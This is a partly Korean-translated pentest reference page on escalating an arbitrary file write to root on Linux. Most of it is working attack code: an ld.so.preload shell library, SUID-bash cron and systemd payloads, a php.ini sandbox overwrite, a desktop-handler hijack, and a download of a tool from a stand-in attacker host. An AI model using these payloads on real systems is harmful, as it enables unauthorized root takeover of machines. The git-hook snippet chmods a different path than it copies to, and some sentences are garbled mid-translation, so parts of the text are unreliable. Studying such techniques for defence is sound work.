# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

이 파일은 **`LD_PRELOAD`** 환경 변수처럼 동작하지만 **SUID binaries**에서도 작동합니다.\
만약 이 파일을 생성하거나 수정할 수 있다면, 각 실행되는 바이너리와 함께 로드될 **라이브러리의 경로**를 추가하면 됩니다.

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)는 git repository에서 커밋이 생성되거나 merge...와 같은 다양한 **events**에서 **run**되는 **scripts**입니다. 따라서 **privileged script or user**가 이러한 작업을 자주 수행하고 **write in the `.git` folder**가 가능하다면, 이는 **privesc**에 이용될 수 있습니다.

예를 들어, git repo의 **`.git/hooks`**에 **generate a script**를 만들어 새 commit이 생성될 때마다 항상 실행되도록 할 수 있습니다:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron 및 시간 파일

만약 **root가 실행하는 cron 관련 파일을 쓸 수 있다면**, 보통 작업이 다음에 실행될 때 code execution을 얻을 수 있습니다. 흥미로운 대상에는 다음이 포함됩니다:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- root의 crontab (`/var/spool/cron/` 또는 `/var/spool/cron/crontabs/`)
- `systemd` 타이머와 이를 트리거하는 서비스들

빠른 확인:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
일반적인 악용 경로:

- **새로운 root cron job을 추가**하여 `/etc/crontab` 또는 `/etc/cron.d/`의 파일에
- `run-parts`에 의해 이미 실행되는 **script를 교체**
- 실행하는 script나 binary를 수정하여 기존 **timer target에 backdoor를 심기**

Minimal cron payload example:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
만약 `run-parts`가 사용하는 cron 디렉터리 안에만 쓸 수 있다면, 대신 실행 파일을 그곳에 놓으세요:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
참고:

- `run-parts`는 보통 점(.)이 포함된 파일명을 무시하므로, `backup.sh` 대신 `backup` 같은 이름을 사용하는 것이 좋다.
- 일부 배포판은 기존 cron 대신 `anacron` 또는 `systemd` timers를 사용하지만, 악용 아이디어는 동일하다: **root가 나중에 실행할 것을 수정하라**.

### 서비스 및 소켓 파일

만약 **`systemd` unit files** 또는 이들이 참조하는 파일을 쓸 수 있다면, 유닛을 재로드하고 재시작하거나 서비스/소켓 활성화 경로가 트리거되기를 기다려 root 권한으로 코드 실행을 얻을 수 있다.

흥미로운 대상은 다음과 같다:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

빠른 점검:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
일반적인 악용 경로:

- **Overwrite `ExecStart=`** 수정 가능한 루트 소유의 서비스 유닛에서
- **Add a drop-in override** 악성 `ExecStart=` 를 포함하도록 drop-in override를 추가하고 먼저 기존 것을 제거
- **Backdoor the script/binary** 유닛이 이미 참조하는 스크립트/바이너리에 백도어 심기
- **Hijack a socket-activated service** 소켓에 연결이 들어오면 시작되는 해당 `.service` 파일을 수정하여

예제 악성 override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
일반적인 활성화 흐름:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
If you cannot restart services yourself but can edit a socket-activated unit, you may only need to **클라이언트 연결을 기다리기만** to trigger execution of the backdoored service as root.

### 권한 있는 PHP sandbox에서 사용되는 제한된 `php.ini` 덮어쓰기

Some custom daemons validate user-supplied PHP by running `php` with a **제한된 `php.ini`** (for example, `disable_functions=exec,system,...`). If the 샌드박스된 코드 still has **어떤 쓰기 primitive** (like `file_put_contents`) and you can reach the **정확한 `php.ini` path** used by the daemon, you can **해당 설정을 덮어써서** restrictions를 해제한 뒤 권한 상승된 상태로 실행되는 두 번째 페이로드를 제출할 수 있습니다.

Typical flow:

1. First payload overwrites the sandbox config.
2. Second payload executes code now that dangerous functions are re-enabled.

Minimal example (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

피해자의 설정 디렉터리에 대한 쓰기 권한을 가진 공격자는 시스템 동작을 변경하는 파일을 쉽게 교체하거나 생성해 의도하지 않은 코드 실행을 유발할 수 있습니다. `$HOME/.config/mimeapps.list` 파일을 수정하여 HTTP 및 HTTPS URL 핸들러가 악성 파일을 가리키도록 설정(예: `x-scheme-handler/http=evil.desktop`)하면, 공격자는 **어떤 http 또는 https 링크를 클릭해도 해당 `evil.desktop` 파일에 지정된 코드가 실행되도록** 만들 수 있습니다. 예를 들어, `$HOME/.local/share/applications`에 `evil.desktop`에 다음 악성 코드를 배치한 후 외부 URL을 클릭하면 포함된 명령이 실행됩니다:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
자세한 내용은 [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49)을 확인하세요. 여기서는 실제 취약점 악용에 사용되었습니다.

### 루트가 실행하는 사용자 쓰기 가능한 스크립트/바이너리

권한이 있는 워크플로우가 `/bin/sh /home/username/.../script` (또는 권한이 없는 사용자가 소유한 디렉터리 안의 어떤 바이너리)을 실행한다면, 이를 하이재킹할 수 있습니다:

- **실행 감지:** [pspy](https://github.com/DominicBreuker/pspy)로 프로세스를 모니터링하여 루트가 사용자 제어 경로를 호출하는 것을 포착하세요:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** 대상 파일과 그 디렉터리가 현재 사용자에 의해 소유되며 쓰기 가능한지 확인하세요.
- **Hijack the target:** 원본 binary/script를 백업하고 SUID shell(또는 다른 root action)을 생성하는 payload를 배치한 뒤 권한을 복원하세요:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **특권 동작을 트리거** (예: helper를 생성하는 UI 버튼을 누름). root가 hijacked path를 다시 실행하면, `./rootshell -p`로 권한 상승된 셸을 획득하세요.

## 참고자료

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
